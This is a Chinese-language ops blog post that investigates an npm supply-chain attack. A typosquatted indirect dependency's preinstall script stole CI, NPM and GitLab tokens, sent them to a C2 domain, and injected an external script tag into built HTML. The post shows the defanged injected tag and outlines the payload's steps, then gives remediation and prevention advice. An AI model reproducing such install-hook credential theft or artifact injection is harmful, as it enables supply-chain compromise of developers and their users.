@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="CI 构建产物被植入外联后门，溯源发现 npm 间接依赖遭投毒，postinstall 脚本窃走令牌并篡改产物。">
+<title>记一次 npm 开源依赖投毒导致 CI 构建产物被植入后门的排查</title>
+
+
+<link rel="canonical" href="https://blog.5772447.xyz/posts/fd39f333/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.59c5eb617b2b83358d0baf163162325d5249a2be44239b430beb29a87c1ddbe4.css"><meta property='og:title' content="记一次 npm 开源依赖投毒导致 CI 构建产物被植入后门的排查">
+<meta property='og:description' content="CI 构建产物被植入外联后门，溯源发现 npm 间接依赖遭投毒，postinstall 脚本窃走令牌并篡改产物。">
+<meta property='og:url' content='https://blog.5772447.xyz/posts/fd39f333/'>
+<meta property='og:site_name' content='Zero Day Notes'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='供应链投毒' /><meta property='article:tag' content='npm投毒' /><meta property='article:tag' content='依赖投毒' /><meta property='article:tag' content='软件供应链' /><meta property='article:tag' content='CI构建后门' /><meta property='article:tag' content='包投毒' /><meta property='article:tag' content='typosquatting' /><meta property='article:tag' content='SBOM' /><meta property='article:published_time' content='2026-07-19T07:00:00&#43;08:00'/><meta property='article:modified_time' content='2026-07-19T07:00:00&#43;08:00'/>
+<meta name="twitter:title" content="记一次 npm 开源依赖投毒导致 CI 构建产物被植入后门的排查">
+<meta name="twitter:description" content="CI 构建产物被植入外联后门，溯源发现 npm 间接依赖遭投毒，postinstall 脚本窃走令牌并篡改产物。">
+    <link rel="shortcut icon" href="/img/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        <figure class="site-avatar">
+                <a href="/">
+                    <img src="/img/avatar.jpg" 
+                        width="300"
+                        height="300"
+                        class="site-logo"
+                        loading="lazy"
+                        alt="Avatar">
+                </a>
+                
+                    <span class="emoji">🛠️</span>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Zero Day Notes</a></h1>
+            <h2 class="site-description">IT 运维实战笔记</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Maskbugzero'
+                        
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/page/archives/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tags' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>标签</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/categories' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>分类</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ul>
+    <li><a href="#一问题背景">一、问题背景</a></li>
+    <li><a href="#二故障现象">二、故障现象</a></li>
+    <li><a href="#三排查过程">三、排查过程</a></li>
+    <li><a href="#四解决方案">四、解决方案</a></li>
+    <li><a href="#五根因分析">五、根因分析</a></li>
+    <li><a href="#六预防措施">六、预防措施</a></li>
+    <li><a href="#七总结">七、总结</a></li>
+  </ul>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+            
+            
+            <a href="/categories/%E8%BF%90%E7%BB%B4/" style="background-color: hsl(50, 60%, 84%); color: hsl(50, 60%, 15%);">
+                运维
+            </a>
+        
+            
+            
+            
+            <a href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/" style="background-color: hsl(190, 60%, 84%); color: hsl(190, 60%, 15%);">
+                安全运维
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/fd39f333/">记一次 npm 开源依赖投毒导致 CI 构建产物被植入后门的排查</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            CI 构建产物被植入外联后门，溯源发现 npm 间接依赖遭投毒，postinstall 脚本窃走令牌并篡改产物。
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2026-07-19T07:00:00&#43;08:00'>2026年7月19日星期日</time>
+                
+
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                    <time class="article-time--reading">
+                        阅读时长: 6 分钟
+                    </time>
+                
+            </div>
+        
+
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>目录</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ul>
+    <li><a href="#一问题背景">一、问题背景</a></li>
+    <li><a href="#二故障现象">二、故障现象</a></li>
+    <li><a href="#三排查过程">三、排查过程</a></li>
+    <li><a href="#四解决方案">四、解决方案</a></li>
+    <li><a href="#五根因分析">五、根因分析</a></li>
+    <li><a href="#六预防措施">六、预防措施</a></li>
+    <li><a href="#七总结">七、总结</a></li>
+  </ul>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h2 id="一问题背景"><a href="#%e4%b8%80%e9%97%ae%e9%a2%98%e8%83%8c%e6%99%af" class="header-anchor"></a>一、问题背景
+</h2><p>我们前端项目用 npm 管理依赖，发布走一条 GitLab CI 流水线：<code>npm install</code> → <code>webpack build</code> → 产物推 CDN。团队一直以为&quot;依赖是开源社区维护的、可信&quot;，CI 节点直连公网 npm 源，没有私有代理，也没有锁死间接依赖的硬性约束——<code>package-lock.json</code> 虽在，但合并冲突时常被简单&quot;解决&quot;掉，<code>npm install</code> 时仍允许解析浮动。</p>
+<p>某天上午，安全组在例行文件完整性扫描（FIM）里发现，CDN 上几个静态 HTML 入口文件尾部多出了一段不属于我们的外联脚本；与此同时，EDR 在构建节点上抓到一票发往陌生公网 IP 的 HTTPS 出站连接。两条线索指向同一处：构建流水线本身被&quot;污染&quot;了。</p>
+<h2 id="二故障现象"><a href="#%e4%ba%8c%e6%95%85%e9%9a%9c%e7%8e%b0%e8%b1%a1" class="header-anchor"></a>二、故障现象
+</h2><p>最直观的告警来自 CDN 侧。安全扫描比对线上页面与源码仓库，发现生产 HTML 末尾被插入了一行：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn-metric-tech[.]top/analytics.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>源码仓库里没有这段，说明注入发生在&quot;源码 → 产物&quot;之间，也就是 CI 的 install 或 build 阶段。更可疑的是，EDR 在同一构建节点上多次捕获到进程向 <code>cdn-metric-tech[.]top</code> 及一个 C2 域名发起 HTTPS 连接，伴随 <code>npm</code> 进程退出后的短暂 CPU 抖动。</p>
+<p>我们第一时间怀疑源码仓库被改，但 <code>git log</code> 干净；又怀疑构建节点本身中马（像之前的 cron 后门），于是重装了构建机镜像，结果下一轮 <code>npm install</code> 后，后门<strong>又出现了</strong>。这基本排除了&quot;节点被持久化&quot;，把嫌疑锁死在&quot;每次 install 都会触发的某个东西&quot;——也就是依赖本身。</p>
+<h2 id="三排查过程"><a href="#%e4%b8%89%e6%8e%92%e6%9f%a5%e8%bf%87%e7%a8%8b" class="header-anchor"></a>三、排查过程
+</h2><p><strong>第一步，从产物差异反推注入点。</strong> 用干净的源码重新跑 <code>webpack build</code>（跳过 install，复用已缓存的 <code>node_modules</code>），产物里<strong>没有</strong>那段外联脚本；但只要重新 <code>npm install</code>，再 build，后门就回来。于是确定：注入不在 webpack，而在 install 阶段被某个依赖的 <code>postinstall</code>/<code>preinstall</code> 生命周期脚本完成。</p>
+<p><strong>第二步，盯 install 日志。</strong> 重新 install 时加 <code>--verbose</code>，注意到一条不寻常的输出：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; malformed-utils@1.2.4 preinstall /build/node_modules/malformed-utils
+</span></span><span style="display:flex;"><span>&gt; node preinstall.js
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>malformed-utils</code> 这个名字眼生——我们项目里用的是 <code>lodash</code>、<code>dayjs</code> 这类，从没直接依赖过它。去 <code>package-lock.json</code> 里一查，它是某业务组件库的<strong>间接依赖</strong>，而且版本是 <code>1.2.4</code>，而 npm 上同名的&quot;正常&quot;版本停在 <code>1.1.0</code>。版本号反常地高，且发布时间就在出事前两天——典型的 typosquatting（抢注形近包名）+ 高版本抢优先解析。</p>
+<p><strong>第三步，解剖恶意包。</strong> 把 tarball 拉下来解包：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>npm pack malformed-utils@1.2.4
+</span></span><span style="display:flex;"><span>tar -xzf malformed-utils-1.2.4.tgz
+</span></span><span style="display:flex;"><span>cat package/package.json   <span style="color:#75715e"># 看到 &#34;preinstall&#34;: &#34;node preinstall.js&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>preinstall.js</code> 是混淆后的代码，反混淆后逻辑清晰：</p>
+<ol>
+<li>读取环境变量与 <code>.npmrc</code>，收集 <code>CI_TOKEN</code>、<code>NPM_TOKEN</code>、<code>GITLAB_TOKEN</code> 等敏感凭据；</li>
+<li>把凭据 POST 到 C2（<code>cdn-metric-tech[.]top/api/collect</code>）；</li>
+<li>找到构建输出目录（通过 <code>process.env.OUTPUT_DIR</code> 或遍历 <code>dist/</code>），在 HTML/入口 JS 里注入外联脚本，实现&quot;产物后门&quot;；</li>
+<li>完成后自我清理临时文件，降低痕迹。</li>
+</ol>
+<p><strong>第四步，还原影响面。</strong> 确认该恶意包是在一次依赖升级（某组件库小版本更新，其间接依赖树把 <code>malformed-utils</code> 拉了进来）时被引入；CI 节点因为 <code>npm install</code> 允许间接依赖解析浮动，直接装到了投毒的高版本。已泄露的包括构建机上的 NPM token 和 GitLab CI token——攻击者理论上能用它们发版、读仓库。</p>
+<p><strong>第五步，固定证据。</strong> 保存了恶意 tarball、被注入产物的 diff、EDR 出站连接日志、C2 域名，作为后续复盘与威胁情报上报材料。</p>
+<h2 id="四解决方案"><a href="#%e5%9b%9b%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88" class="header-anchor"></a>四、解决方案
+</h2><p><strong>分钟级止血：</strong></p>
+<ul>
+<li>立即在 npm / GitLab 后台<strong>吊销所有 CI token、NPM token</strong>，让泄露凭据失效；</li>
+<li>隔离当前构建节点，从受信基线镜像<strong>重建</strong>，清除内存里残留的进程与可疑文件；</li>
+<li>在 CI 里临时把安装源切到私有缓存（不含该包的旧快照），先恢复日常发布能力。</li>
+</ul>
+<p><strong>小时级清除：</strong></p>
+<ul>
+<li>从 <code>package.json</code> 与 <code>package-lock.json</code> 中<strong>彻底移除 <code>malformed-utils</code></strong>，重写 lockfile，强制用 <code>npm ci</code>（严格按 lock 安装、禁止版本浮动）；</li>
+<li>全量重新发布 CDN 资源——用干净源码重新 build，覆盖掉被注入外联脚本的线上文件；</li>
+<li>排查所有仓库是否有同一间接依赖，批量清理并重新生成 SBOM。</li>
+</ul>
+<p><strong>当天加固：</strong> 搭建 Nexus/Verdaccio 私有代理，只允许白名单 scope 内的包从公网同步，构建机网络层面禁止直连 <code>registry.npmjs.org</code>。</p>
+<h2 id="五根因分析"><a href="#%e4%ba%94%e6%a0%b9%e5%9b%a0%e5%88%86%e6%9e%90" class="header-anchor"></a>五、根因分析
+</h2><p>根因不在&quot;某个具体包坏了&quot;，而在<strong>对软件供应链的信任被无约束地放行</strong>：</p>
+<ol>
+<li>CI 节点直连公网 npm，<code>npm install</code> 允许间接依赖版本解析浮动，攻击者用高版本形近包抢走优先解析权；</li>
+<li><code>package-lock.json</code> 未被强制锁定（合并冲突被草率&quot;解决&quot;、CI 用 <code>npm install</code> 而非 <code>npm ci</code>），失去&quot;依赖指纹&quot;这道防线；</li>
+<li>缺少依赖完整性校验：没有 SBOM、没有 <code>npm audit</code>/签名校验，投毒包能悄无声息混进构建；</li>
+<li>构建节点持有长期静态 token 且权限过大，一旦凭据在 install 阶段被读取即全面失守。</li>
+</ol>
+<p>本质是：我们把&quot;开源社区的可信&quot;当成了&quot;无需管控的可信&quot;，在信任链上留了多个无人把守的口子。</p>
+<h2 id="六预防措施"><a href="#%e5%85%ad%e9%a2%84%e9%98%b2%e6%8e%aa%e6%96%bd" class="header-anchor"></a>六、预防措施
+</h2><ul>
+<li><strong>锁死依赖</strong>：CI 强制 <code>npm ci</code>（或 pnpm/yarn 的等价严格模式），禁止 <code>npm install</code> 浮动解析；<code>package-lock.json</code> 纳入 code review，合并冲突不得草率覆盖。</li>
+<li><strong>控来源</strong>：构建机经私有代理（Nexus/Verdaccio）拉包，开启允许列表（allowlist）+ 镜像同步；网络层禁止构建机直连公网 npm 源。</li>
+<li><strong>校验完整性</strong>：发布前生成 SBOM（CycloneDX），并启用 <code>npm audit</code> / <code>osv-scanner</code> / <code>pip-audit</code> 在 CI 阶段<strong>阻断高危依赖</strong>；对关键依赖启用 npm attestations / Sigstore 签名验证。</li>
+<li><strong>最小权限</strong>：构建节点的凭据用 OIDC 短时效令牌，禁止长期静态 token；CI token 仅授予&quot;发布必要仓库&quot;的最小 scope。</li>
+<li><strong>运行时监控</strong>：在构建产物目录部署文件完整性监控（FIM），对 HTML/JS 的异常外联引用、构建机异常出站连接即时告警；建立&quot;源码 vs 产物&quot;的差异比对基线。</li>
+</ul>
+<h2 id="七总结"><a href="#%e4%b8%83%e6%80%bb%e7%bb%93" class="header-anchor"></a>七、总结
+</h2><p>这次事件里，攻击者没有攻破任何服务器，只是&quot;借用开发者信任链&quot;：用一个形近的高版本包，在每次 <code>npm install</code> 时堂而皇之地跑起 <code>preinstall</code> 脚本，顺手牵走 token、给产物埋雷。供应链投毒是典型的高杠杆、低成本攻击——你信任的，恰恰是它利用的。</p>
+<p>防御的核心就四句话：<strong>锁依赖（npm ci + 锁 lockfile）、控来源（私有代理 + 白名单）、校验完整性（SBOM + audit + 签名）、最小权限（短时效 token + 产物 FIM）</strong>。把公网包从&quot;无条件信任&quot;变成&quot;受控、可审计的依赖&quot;，这类&quot;安装即中招&quot;的事故就能从根上断掉。</p>
+
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E4%BE%9B%E5%BA%94%E9%93%BE%E6%8A%95%E6%AF%92/">供应链投毒</a>
+        
+            <a href="/tags/npm%E6%8A%95%E6%AF%92/">Npm投毒</a>
+        
+            <a href="/tags/%E4%BE%9D%E8%B5%96%E6%8A%95%E6%AF%92/">依赖投毒</a>
+        
+            <a href="/tags/%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE/">软件供应链</a>
+        
+            <a href="/tags/ci%E6%9E%84%E5%BB%BA%E5%90%8E%E9%97%A8/">CI构建后门</a>
+        
+            <a href="/tags/%E5%8C%85%E6%8A%95%E6%AF%92/">包投毒</a>
+        
+            <a href="/tags/typosquatting/">Typosquatting</a>
+        
+            <a href="/tags/sbom/">SBOM</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+
+        <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2026 Zero Day Notes
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.3">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.f856840516f7c2ad1769a8f5937e3d08d6cb386e2cd2dd025ae696e0ff207958.js" defer></script>
+
+
+    </body>
+</html>
